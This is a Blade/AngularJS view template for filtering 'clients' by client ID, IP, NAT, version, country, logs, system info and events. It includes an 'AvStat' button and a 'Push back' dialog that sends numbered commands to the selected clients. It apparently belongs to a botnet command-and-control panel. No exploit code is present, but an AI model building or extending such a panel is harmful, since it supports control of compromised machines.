<div class="well" ng-controller="clientIdFilter">
    <div class="row">
        <div class="col-lg-12" ng-show="errors" ng-cloak>
            <div class="alert alert-danger">
                @{{ errors }}
                <button type="button" class="close" ng-click="errors = undefined"><span aria-hidden="true">&times;</span></button>
            </div>
        </div>
        <div class="col-lg-12">
            <div class="input-group input-group-sm">
                {!! Form::input('client_filter', null, [
                    'class' => 'form-control',
                    'placeholder' => 'Input client...',
                    'ng-model' => 'clientId'
                ]) !!}
                <span class="input-group-btn">
                    {!! Form::button('client_filter_btn', '<span class="glyphicon glyphicon-search"></span>', [
                        'class' => 'btn btn-primary btn-sm btn-inverse',
                        'style' => 'height:29px;',
                        'ng-click' => 'apply()'
                    ]) !!}
                </span>
            </div>
        </div>
    </div>
</div>

<div class="well well-sm" ng-controller="clientFilter">
    <div id="filter" class="panel-body">
        {!! Form::open() !!}
        <table class="table table-condensed" id="clientFilterTable" style="margin-bottom: 0px;">
            <thead>
            <tr>
                <td width="210px"><b>Select fields you need:</b></td>
                <td>
                    <label>
                      {!! Form::input('name', null, [
                      'type' => 'checkbox',
                      'ng-model' => 'filter.additionalEnabled']) !!}
                    Filter by Country, Group, Logs or SysInfo
                    </label>
                </td>
                <td>
                    <label>
                      {!! Form::input('name', null, [
                      'type' => 'checkbox',
                      'ng-model' => 'filter.eventsEnabled']) !!}
                    Filter by events
                    </label>
                </td>
                <td></td>
                <td colspan="3">
                    <label>
                      {!! Form::input('name', null, [
                      'type' => 'checkbox',
                      'ng-click' => 'changeSearchType($event)',
                      'ng-model' => 'filter.exactMatchingSearch']) !!}
                    Search only the enttire query
                    </label>
                </td>
            </tr>
            <tr>
                <td>Prefix</td>
                <td>IP</td>
                <td width="210px">CreatedAt</td>
                <td width="200px">Importance</td>
                <td>Version</td>
                <td>LastActivity</td>
                <td>Nat</td>
            </tr>
            </thead>
            <tbody style="margin-bottom: 20px;">
            <tr>
                <!-- Prefix -->
                <td>
                    {!! Form::input('name', null, ['class' => 'form-control input-sm', 'ng-model' => 'filter.name']) !!}
                </td>
                <!-- IP -->
                <td>
                    {!! Form::input('ip', null, ['class' => 'form-control input-sm', 'ng-model' => 'filter.ip']) !!}
                </td>
                <!-- Registered -->
                <td width="210px">
                    <div class="input-daterange input-group input-group-sm datepicker-range">
                        {!! Form::input('start', null, ['class' => 'form-control input-sm', 'ng-model' => 'filter.start']) !!}
                        <span class="input-group-addon">/</span>
                        {!! Form::input('end', null, ['class' => 'form-control input-sm', 'ng-model' => 'filter.end']) !!}
                    </div>
                </td>
                <!-- Importance -->
                <td width="200px">
                    <div class="input-daterange input-group input-group-sm">
                        {!! Form::input('importance_start', null, [
                            'ng-model' => 'filter.importance_start',
                            'class' => 'form-control input-sm',
                            'type' => 'number',
                            'min' => 0,
                            'max' => Auth::instance()->get_user()->getDefaultMaxImportanceView()
                        ]) !!}
                        <span class="input-group-addon">/</span>
                        {!! Form::input('importance_end', null, [
                            'ng-model' => 'filter.importance_end',
                            'class' => 'form-control input-sm',
                            'type' => 'number',
                            'min' => 0,
                            'max' => Auth::instance()->get_user()->getDefaultMaxImportanceView()
                        ]) !!}
                    </div>
                </td>
                <td>
                    {!! Form::input('version', null, [
                        'class' => 'form-control input-sm',
                        'ng-model' => 'filter.version'
                    ]) !!}
                </td>
                <!-- Last Activity -->
                <td>
                    {!! Form::select('last_activity', $lastactivity_options, null, [
                        'class' => 'selectpicker col-',
                        'ng-model' => 'filter.last_activity'
                    ]) !!}
                </td>
                <!-- Nat -->
                <td>
                    {!! Form::select('nat', Kohana::$config->load('select.nat'), null, [
                        'class' => 'selectpicker col-',
                        'ng-model' => 'filter.nat'
                    ]) !!}
                </td>

            </tr>
            <tr ng-show="filter.additionalEnabled">
                <td>Country</td>
                <td>Group</td>
                <td></td>
                <td colspan="2">Logs</td>
                <td>Logs CreatedAt</td>
                <td>SysInfo</td>
            </tr>
            <tr ng-show="filter.additionalEnabled">
                <!-- Location -->
                <td>
                    {!! Form::select('country', $location_options, null, [
                        'ng-model' => 'filter.country',
                        'style' => 'width: 100%;',
                        'multiple' => '',
                        'id' => 'country',
                    ]) !!}
                </td>
                <td>
                    {!! Form::select('group', $group_options, null, [
                        'ng-model' => 'filter.group',
                        'style' => 'width: 100%;',
                        'multiple' => '',
                        'id' => 'group',
                    ]) !!}
                </td>
                <td></td>
                <td colspan="2">
                    {!! Form::select('log', [], null, [
                        'ng-model' => 'filter.log',
                        'style' => 'width: 100%;',
                        'multiple' => '',
                        'id' => 'log',
                    ]) !!}
                </td>
                <td>
                    <div class="input-daterange input-group input-group-sm">
                        {!! Form::input('log_start', null, ['id' => 'log_start', 'class' => 'form-control input-sm', 'ng-model' => 'filter.log_start']) !!}
                        <span class="input-group-addon">/</span>
                        {!! Form::input('log_end', null, ['id' => 'log_end', 'class' => 'form-control input-sm', 'ng-model' => 'filter.log_end']) !!}
                    </div>
                </td>
                <td>
                    {!! Form::select('sysinfo', $sysinfo_options, null, [
                        'ng-model' => 'filter.sysinfo',
                        'style' => 'width: 100%;',
                        'multiple' => '',
                        'id' => 'sysinfo',
                    ]) !!}
                </td>
            </tr>

            <!-- Events -->
            <tr ng-show="filter.eventsEnabled">
              <td>Event</td>
              <td colspan="2">Event info</td>
              <td>Event module</td>
              <td></td>
              <td colspan="2">Event CreatedAt</td>
            </tr>
            <tr ng-show="filter.eventsEnabled">
              <td>
                  {!! Form::select('events', [], null, [
                        'ng-model' => 'filter.events',
                        'style' => 'width: 100%;',
                        'multiple' => '',
                        'id' => 'events',
                  ]) !!}
              </td>
              <td colspan="2">
                  {!! Form::select('events_info', [], null, [
                      'ng-model' => 'filter.events_info',
                      'style' => 'width: 100%;',
                      'multiple' => '',
                      'id' => 'events_info',
                  ]) !!}
              </td>
              <td colspan="2">
                  {!! Form::select('events_module', $events_modules, null, [
                      'ng-model' => 'filter.events_module',
                      'style' => 'width: 100%;',
                      'multiple' => '',
                      'id' => 'events_module',
                  ]) !!}
              </td>
              <td colspan="2">
                  <div class="input-daterange input-group input-group-sm datepicker-range">
                      {!! Form::input('events_start', null, ['class' => 'form-control input-sm', 'ng-model' => 'filter.events_start']) !!}
                      <span class="input-group-addon">/</span>
                      {!! Form::input('events_end', null, ['class' => 'form-control input-sm', 'ng-model' => 'filter.events_end']) !!}
                  </div>
              </td>

            </tr>

            </tbody>
            <tfoot>
            <tr>
                <td colspan="7">
{{--                    {!! Form::checkbox('get_stat', '1', '1' == Arr::get($post, 'get_stat')).' Get stat?' !!}--}}
                    <div ng-controller="statBtn" class="btn-group btn-group-sm pull-left">
                        <button type="button" class="btn btn-primary btn-inverse" ng-click="ipStatBtn()">IPStat</button>
                        <button type="button" class="btn btn-primary btn-inverse" ng-click="geoStatBtn()">GeoStat</button>
                        <button type="button" class="btn btn-primary btn-inverse" ng-click="systemStatBtn()">SystemStat</button>
                        <button type="button" class="btn btn-primary btn-inverse" ng-click="userSystemStatBtn()">UserSystemStat</button>
                        <button type="button" class="btn btn-primary btn-inverse" ng-click="avStatBtn()">AvStat</button>
                    </div>
                    <div ng-show="total" class="total pull-left" ng-cloak>Total: @{{ total }}</div>
                    <div class="btn-group btn-group-sm pull-right">
                        {!! Form::button('reset','Reset', [
                            'class' => 'btn btn-danger btn-sm btn-inverse',
                            'type'  => 'button',
                            'ng-click' => 'reset()',
                        ]) !!}
                        {!! Form::button('apply','Apply', [
                            'class' => 'btn btn-success btn-sm btn-inverse',
                            'type'  => 'button',
                            'ng-click' => 'apply()',
                        ]) !!}
                    </div>
                    {!! Form::button('push_back', 'Push back', [
                        'class' => 'btn btn-primary pull-right btn-sm btn-inverse',
                        'type' => 'button',
                        'style' => 'margin-right: 10px;',
                        'data-toggle' => 'modal',
                        'data-target' => '#myModalPushBack',
                        'ng-disabled' => 'pushBackBtn',
                        'ng-clock' => '',
                    ]) !!}
                </td>

            </tr>
            </tfoot>
        </table>
        {!! Form::close() !!}
    </div>


    <div class="modal-bg modal fade" style="display: none;" ng-click="closeModalDialog($event)">
        @include('TEMPLATE.modals.alert')
    </div>

    <div class="modal fade" id="myModalPushBack" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                    <h4 class="modal-title" id="myModalLabel">Push Back</h4>
                </div>
                <div class="modal-body">
                    <table class="table table-condensed">
                        <tr>
                            <td>
                                {!! Form::input('push_back_param', null, [
                                    'class' => 'form-control',
                                    'placeholder' => 'Param',
                                    'id' => 'push_back_param',
                                    'ng-model' => 'modalParams',
                                ]) !!}
                            </td>
                        </tr>
                        <tr>
                            <td>
                                {!! Form::input('push_back_command', null, [
                                    'class' => 'form-control',
                                    'placeholder' => 'Command',
                                    'id' => 'push_back_command',
                                    'type' => 'number',
                                    'ng-model' => 'modalIncode',
                                     'ng-disabled' => ""
                                ]) !!}
                            </td>
                        </tr>
                    </table>
                </div>
                <div class="modal-footer">
                    <div class="btn-group btn-group-sm pull-right">
                        {!! Form::button('send', 'Close', [
                            'class' => 'btn btn-danger btn-inverse',
                            'data-dismiss' => 'modal'
                        ]) !!}
                        {!! Form::button('push_back_apply', 'Apply', [
                            'class' => 'btn btn-primary btn-inverse',
                            'type' => 'button',
                            'id' => 'push_back_apply',
                            'ng-click' => 'pushBack()',
                            'data-dismiss' => 'modal',
                        ]) !!}
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

{{--<div class="row">--}}
    {{--<div class="col-md-12">--}}
            {{--<div class="pull-right">--}}
                {{--<div class="row">--}}
                    {{--<div class="col-md-12">--}}
                        {{--@if(isset($post['get_stat']))--}}
                            {{--<button class="btn btn-success btn-inverse btn-xs" data-toggle="modal" data-target="#myModal">GlobalStat</button>--}}
                        {{--@else--}}
                            {{--<button class="btn btn-primary btn-inverse btn-xs" disabled data-toggle="modal" data-target="#myModal">GlobalStat</button>--}}
                        {{--@endif--}}
                    {{--</div>--}}
                {{--</div>--}}
                {{--@if ( isset($pagination) )--}}
                    {{--<div class="row" style="text-align: center">--}}
                        {{--<div class="col-md-12">--}}
                            {{--Total: {{ $pagination->total_items }}--}}
                        {{--</div>--}}
                    {{--</div>--}}
                {{--@endif--}}
            {{--</div>--}}
    {{--</div>--}}
{{--</div>--}}
